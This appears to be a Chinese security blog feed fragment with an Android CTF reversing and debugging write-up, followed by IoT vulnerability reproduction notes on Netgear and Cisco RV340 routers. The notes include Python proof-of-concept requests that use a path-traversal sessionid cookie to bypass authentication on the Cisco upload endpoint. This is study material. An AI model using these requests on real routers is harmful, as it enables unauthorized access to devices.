&#125;</span><br><span class="line">            sb.append(Integer.toHexString(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString(); <span class="comment">// 返回string</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException | NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v4.a.k, android.app.Activity</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2, Intent intent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(i, i2, intent);</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">                String[] strArr = &#123;<span class="string">&quot;_data&quot;</span>&#125;;</span><br><span class="line">                <span class="type">Cursor</span> <span class="variable">query</span> <span class="operator">=</span> getContentResolver().query(intent.getData(), strArr, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                query.moveToFirst();</span><br><span class="line">                <span class="type">String</span> <span class="variable">file_path</span> <span class="operator">=</span> query.getString(query.getColumnIndex(strArr[<span class="number">0</span>])); <span class="comment">// 源文件路径</span></span><br><span class="line">                query.close();</span><br><span class="line">                enc(file_path, getFilesDir().getAbsolutePath() + file_path.substring(file_path.lastIndexOf(<span class="string">&quot;/&quot;</span>)) + <span class="string">&quot;.lock&quot;</span>, j());</span><br><span class="line">                i();</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, String.format(<span class="string">&quot;%s encrypting&quot;</span>, file_path), <span class="number">1</span>).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v7.app.c, android.support.v4.a.k, android.app.Activity</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    findViewById(R.id.encrypt).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.a.sample.picturelock.MainActivity.1</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.a(<span class="built_in">this</span>, <span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>) != <span class="number">0</span>) &#123; <span class="comment">// 判断是否有写入外部存储权限</span></span><br><span class="line">                android.support.v4.a.a.a((Activity) <span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&#125;, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.PICK&quot;</span>, (Uri) <span class="literal">null</span>); <span class="comment">// 动作</span></span><br><span class="line">            intent.setDataAndType(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, <span class="string">&quot;image/*&quot;</span>); <span class="comment">// 间接调用了MediaStore内容提供器</span></span><br><span class="line">            MainActivity.<span class="built_in">this</span>.startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    findViewById(R.id.refresh).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.a.sample.picturelock.MainActivity.2</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            MainActivity.<span class="built_in">this</span>.i();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    i();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看native层的enc函数 参数(文件的真实路径，目标路径，文件签名的md5)，第三个参数可以hook看一眼即可得到：<code>f8c49056e4ccf9a11e090eaf471f418d</code></p><p>不hook也可以直接得到</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PS D:\android_re\CTF\wiki\picture&gt; apksigner verify --verbose --print-certs picturelock.<span class="function">apk</span></span><br><span class="line"><span class="function">Verifies</span></span><br><span class="line"><span class="function">Verified <span class="keyword">using</span> v1 <span class="title">scheme</span> <span class="params">(JAR signing)</span>: true</span></span><br><span class="line"><span class="function">Verified using v2 scheme (APK Signature Scheme v2): true</span></span><br><span class="line"><span class="function">Verified using v3 scheme (APK Signature Scheme v3): false</span></span><br><span class="line"><span class="function">Verified using v3<span class="number">.1</span> scheme (APK Signature Scheme v3<span class="number">.1</span>): false</span></span><br><span class="line"><span class="function">Verified using v4 scheme (APK Signature Scheme v4): false</span></span><br><span class="line"><span class="function">Verified for SourceStamp: false</span></span><br><span class="line"><span class="function">Number of signers: <span class="number">1</span></span></span><br><span class="line"><span class="function">Signer #<span class="number">1</span> certificate DN: CN=</span>a, OU=b, O=c, L=d, ST=e, C=ff</span><br><span class="line">Signer #<span class="number">1</span> certificate SHA<span class="number">-256</span> digest: ba12c13fd60e0def17ae3aee4e6a816782d0367ff02e37ccad5d6e86870c8e38</span><br><span class="line">Signer #<span class="number">1</span> certificate SHA<span class="number">-1</span> digest: <span class="number">48e7045</span>ee60d9d8a257c5275e3650609a5cca13e</span><br><span class="line">Signer #<span class="number">1</span> certificate MD5 digest: f8c49056e4ccf9a11e090eaf471f418d</span><br><span class="line">Signer #<span class="number">1</span> key algorithm: RSA</span><br><span class="line">Signer #<span class="number">1</span> key <span class="built_in">size</span> (bits): <span class="number">2048</span></span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key SHA<span class="number">-256</span> digest: <span class="number">4</span>de55872bc804bf5fccc61c6e42377b24cd6eefc183a800c5807f759f7f9796d</span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key SHA<span class="number">-1</span> digest: dba8196f6f49a1d1291e4c03102bc7225b6f1f25</span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key MD5 digest: d246e0ae52179dfe9daca889ee3133ef</span><br></pre></td></tr></table></figure><p>看到<code>Signer #1 certificate MD5 digest: f8c49056e4ccf9a11e090eaf471f418d</code>就能得到</p><p>so程序的enc程序在调试的时候，老是出现错误，因此就在此留下一个小坑吧，等我变强之后再回来搞定😎</p><h1 id="android逆向之动态调试"><a href="#android逆向之动态调试" class="headerlink" title="android逆向之动态调试"></a>android逆向之动态调试</h1><h2 id="java层调试"><a href="#java层调试" class="headerlink" title="java层调试"></a>java层调试</h2><p>工具：android studio、apktools、smalidea、已经root的手机</p><p>首先apktools反编译apk为output</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk -o output</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb shell #adb进入命令行模式</span><br><span class="line">su #切换至超级用户</span><br><span class="line">magisk resetprop ro.debuggable 1</span><br><span class="line">stop</span><br><span class="line">start #一定要通过该方式重启</span><br></pre></td></tr></table></figure><p>设置手机的ro.debuggable为1，这样任何程序都可以在我们的手机上进行调试（但是缺点就是每次重启都会失效，因此在启动之后都要设置一次</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps</span><br></pre></td></tr></table></figure><p>找到对应的调试进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u0_a137       9261  7805 1120068  56804 SyS_epoll_wait      0 S com.a.sample.picturelock</span><br></pre></td></tr></table></figure><p>PID为9261</p><p>因此设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Lenovo&gt; adb forward tcp:<span class="number">8700</span> jdwp:<span class="number">9261</span></span><br><span class="line"><span class="number">8700</span></span><br></pre></td></tr></table></figure><p>这个8700是android studio中设置的</p><p>来到android studio中</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456734.png" alt="image-20250414101310778" style="zoom: 33%;" /><p>设置如上的部分，output是apktool反编译apk为smali的文件，其中output中的smali文件夹要将其Mark为Sources Root权限</p><p>之后直接到output中进行调试即可</p><h2 id="原生层调试"><a href="#原生层调试" class="headerlink" title="原生层调试"></a>原生层调试</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.a.sample.picturelock/.MainActivity</span><br></pre></td></tr></table></figure><p>然后在adb shell中push进去ida&#x2F;dbgsrv下对应的server，运行，自动监听 23946 port</p><p>然后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></span><br></pre></td></tr></table></figure><p>将PC端的端口转发到手机上对应的服务端口</p><p>之后ida</p><p><code>Debug-&gt;attach-&gt;localhost:23946</code></p><p>选中对应的服务即成功attack上</p><p>然后android studio也attach上java层即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;静态分析java层&quot;&gt;&lt;a href=&quot;#静态分析java层&quot; class=&quot;headerlink&quot; title=&quot;静态分析java层&quot;&gt;&lt;/a&gt;静态分析java层&lt;/h1&gt;&lt;h2 id=&quot;2014-ASIS-Cyber-Security-Contest-Fina</summary>
      
    
    
    
    <category term="安卓逆向" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>一些IoT漏洞复现</title>
    <link href="http://s1nec-1o.github.io/2025/04/06/%E4%B8%80%E4%BA%9BIoT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2025/04/06/%E4%B8%80%E4%BA%9BIoT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-04-06T14:45:13.000Z</published>
    <updated>2025-04-06T15:49:48.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些路由器漏洞复现"><a href="#一些路由器漏洞复现" class="headerlink" title="一些路由器漏洞复现"></a>一些路由器漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一些漏洞的学习笔记，比较的潦草，只是记录一下😊😊😊😊</p><h2 id="CVE-2024-52028"><a href="#CVE-2024-52028" class="headerlink" title="CVE-2024-52028"></a><a href="https://www.cve.org/CVERecord?id=CVE-2024-52028">CVE-2024-52028</a></h2><p>Netgear R7000P v1.3.3.154 被发现通过 wiz_pptp.cgi 上的 pptp_user_netmask 参数存在堆栈溢出。此漏洞允许攻击者通过精心设计的 POST 请求引发拒绝服务 (DoS)。</p><p>固件链接：<a href="https://www.netgear.com/support/product/r7000p/#download">https://www.netgear.com/support/product/r7000p/#download</a></p><p>usr&#x2F;sbin&#x2F;httpd</p><p>没找到！</p><p>Netgear XR300 v1.0.3.78、R7000P v1.3.3.154 和 R6400 v2 1.0.4.128 被发现通过 bsw_pppoe.cgi 的 pppoe_localip 参数包含堆栈溢出。此漏洞允许攻击者通过精心设计的 POST 请求引发拒绝服务 (DoS)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">case 4:</span><br><span class="line">  if ( input_length &gt; *limits )</span><br><span class="line">    return -1;</span><br><span class="line">  for ( check_index2 = 0; check_index2 &lt; input_length; ++check_index2 )</span><br><span class="line">  &#123;</span><br><span class="line">    char_code4 = (unsigned __int8)input_str[check_index2];</span><br><span class="line">    is_invalid_number4 = char_code4 &gt; &#x27;.&#x27;;</span><br><span class="line">    if ( char_code4 != &#x27;.&#x27; )</span><br><span class="line">      is_invalid_number4 = (unsigned __int8)(char_code4 - &#x27;0&#x27;) &gt; 9u;</span><br><span class="line">    if ( is_invalid_number4 )</span><br><span class="line">      return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  sscanf(input_str, &quot;%[^.].%[^.].%[^.].%s&quot;, ip_buffer1, ip_buffer2, ip_buffer3, ip_buffer4); </span><br><span class="line">    //栈溢出</span><br><span class="line">  if ( !ip_buffer1[0] )</span><br><span class="line">    return -1;</span><br><span class="line">  if ( strlen(ip_buffer1) &gt; 3 )</span><br><span class="line">    return -1;</span><br></pre></td></tr></table></figure><p><code>input_str</code>最大长度为2048，但是<code>ip_buffer1-4</code>的长度都很小，且没有开始的判断，数字的溢出Dos</p><h2 id="CVE-2022-20705"><a href="#CVE-2022-20705" class="headerlink" title="CVE-2022-20705"></a>CVE-2022-20705</h2><p><strong>RV340的环境搭建：</strong>从报错出发，尝试解决影响较大的报错，辅以调试或者寻找资料<strong><a href="https://www.yuque.com/cyberangel/rg9gdm/zz75e4">https://www.yuque.com/cyberangel/rg9gdm/zz75e4</a></strong></p><p>Cisco Small Business RV160、RV260、RV340 和 RV345 系列路由器中的多个漏洞可能允许攻击者执行以下任何操作：<strong>执行任意代码、提升权限、执行任意命令、绕过身份验证和授权保护、获取并运行未签名的软件、导致拒绝服务 (DoS)</strong> </p><p>该CVE主要是利用了nginx配置不恰当导致的授权绕过漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">location /form-file-upload &#123;</span><br><span class="line">    include uwsgi_params;</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    uwsgi_modifier1 9;</span><br><span class="line">    uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">    uwsgi_read_timeout 3600;</span><br><span class="line">    uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /upload &#123;</span><br><span class="line">    set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f /tmp/websession/token/$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny = &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    upload_pass /form-file-upload;</span><br><span class="line">    upload_store /tmp/upload;</span><br><span class="line">    upload_store_access user:rw group:rw all:rw;</span><br><span class="line">    upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">    upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">    upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">    upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">    upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">    upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">    upload_cleanup 400 404 499 500-505;</span><br><span class="line">    upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为$cookie_sessionid可控，所以可以将其指向..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，就可以绕过登录。该问题产生的根本原因在于($cookie_sessionid可控导致目录穿越)</p><p>写个Poc测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers_1=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=cyberangel&#x27;&#125;                 # 非法的sessionid</span><br><span class="line">headers_2=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd&#x27;&#125;        # 伪造的sessionid</span><br><span class="line">r_1 = requests.post(url,headers=headers_1,verify=False)</span><br><span class="line">r_2 = requests.post(url,headers=headers_2,verify=False)</span><br><span class="line">print(r_1.text)</span><br><span class="line">print(&quot;-&quot;*50)</span><br><span class="line">print(r_2.text)</span><br><span class="line">r_1.close()</span><br><span class="line">r_2.close()</span><br><span class="line">~/fr/_/_/_f/_/_openwrt-comcerto2000-hgw-r/ubifs-root/1161918421 --------------------------------------------------------------</span><br><span class="line">&gt; python3 test1.py                                                                                   </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以发现换了一种报错，说明就是绕过去了，但是后续还有检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_pass /form-file-upload;</span><br></pre></td></tr></table></figure><p>指定当文件上传完成后，将请求转发到 <code>/form-file-upload</code> 路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location /form-file-upload &#123;</span><br><span class="line">    include uwsgi_params;</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    uwsgi_modifier1 9;</span><br><span class="line">    uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">    uwsgi_read_timeout 3600;</span><br><span class="line">    uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了uwsgi_params，通过127.0.0.1:9003，全局搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">plugins = cgi</span><br><span class="line">workers = 1</span><br><span class="line">master = 1</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">socket=127.0.0.1:9003</span><br><span class="line">buffer-size=4096</span><br><span class="line">cgi = /www/cgi-bin/upload.cgi</span><br><span class="line">cgi-allowed-ext = .cgi</span><br><span class="line">cgi-allowed-ext = .pl</span><br><span class="line">cgi-timeout = 300</span><br><span class="line">ignore-sigpipe = true</span><br></pre></td></tr></table></figure><p>调用upload.cgi对其进行处理，分析upload.cgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if ( httpCookieEnv )</span><br><span class="line"> &#123;</span><br><span class="line">   StrBufSetStr(parsedCookieBuffer, httpCookieEnv);</span><br><span class="line">   httpCookieEnv = 0;</span><br><span class="line">   cookieValue = (char *)StrBufToStr(parsedCookieBuffer);</span><br><span class="line">   for ( parsedToken = strtok_r(cookieValue, &quot;;&quot;, &amp;strtokSavePtr);</span><br><span class="line">         parsedToken;</span><br><span class="line">         parsedToken = strtok_r(0, &quot;;&quot;, &amp;strtokSavePtr) )// strtok对每一个;进行切割，并传递;前的参数</span><br><span class="line">   &#123;</span><br><span class="line">     sessionIdPtr = strstr(parsedToken, &quot;sessionid=&quot;);// 找到;sessionid=</span><br><span class="line">     if ( sessionIdPtr )</span><br><span class="line">       httpCookieEnv = sessionIdPtr + 10;      // 这是sessionid=value的value</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>此处从httpCookie寻找;sessionid&#x3D;value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">else if ( !strcmp(requestUriEnv, &quot;/upload&quot;)</span><br><span class="line">       &amp;&amp; httpCookieEnv</span><br><span class="line">       &amp;&amp; strlen(httpCookieEnv) - 0x10 &lt;= 0x40// sessionid的长度&lt;=0x40</span><br><span class="line">       &amp;&amp; !match_regex(&quot;^[A-Za-z0-9+=/]*$&quot;, httpCookieEnv) )// 正则匹配，字母和数字</span><br><span class="line">&#123;</span><br><span class="line">  destinationParsed = parsedDestinationBuffer;</span><br><span class="line">  uploadOption = parsedOptionBuffer;</span><br><span class="line">  parameterType = parsedFileTypeBuffer;</span><br><span class="line">  completeFileBufferPath = StrBufToStr(filePathWrapperBuffer);</span><br><span class="line">  sub_12684(</span><br><span class="line">    httpCookieEnv,</span><br><span class="line">    destinationParsed,</span><br><span class="line">    uploadOption,</span><br><span class="line">    parameterType,</span><br><span class="line">    completeFileBufferPath,</span><br><span class="line">    parsedCertNameBuffer,</span><br><span class="line">    parsedCertTypeBuffer,</span><br><span class="line">    parsedPasswordBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求存在sessionid，因此还要设置sessionid</p><p>如此便可未授权上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import request</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd;sessionid=&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349438.png" alt="image-20250226195154748"></p><p>浏览器cookie条目为：Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA&#x3D;（base64解码为cisco&#x2F;192.168.121.138&#x2F;2220）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@Router:~/rootfs/tmp/websession# cat session</span><br><span class="line">&#123;</span><br><span class="line">  &quot;max-count&quot;:1,</span><br><span class="line">  &quot;cisco&quot;:&#123;</span><br><span class="line">    &quot;Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA=&quot;:&#123;</span><br><span class="line">      &quot;user&quot;:&quot;cisco&quot;,</span><br><span class="line">      &quot;group&quot;:&quot;admin&quot;,</span><br><span class="line">      &quot;time&quot;:2344,</span><br><span class="line">      &quot;access&quot;:1,</span><br><span class="line">      &quot;timeout&quot;:1800,</span><br><span class="line">      &quot;leasetime&quot;:0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;root@Router:~/rootfs/tmp/websession# cat ./token/Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA\= </span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA=;&#x27;&#125;</span><br><span class="line">r = requests.post(url,headers=headers,verify=False)</span><br><span class="line">print(r.text)</span><br><span class="line">~/fr/_/_/_f/_/_openwrt-comcerto2000-hgw-r/ubifs-root/1161918421 --------------------------------------------------------------</span><br><span class="line">&gt; python3 test2.py</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这时候仔细分析upload.cgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( !parsedFilePathBuffer )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;Content-type: text/html\n&quot;);</span><br><span class="line">   printf(&quot;Error Input&quot;);</span><br><span class="line">   goto LABEL_36;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这个地方得跳过，因此file.path需存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 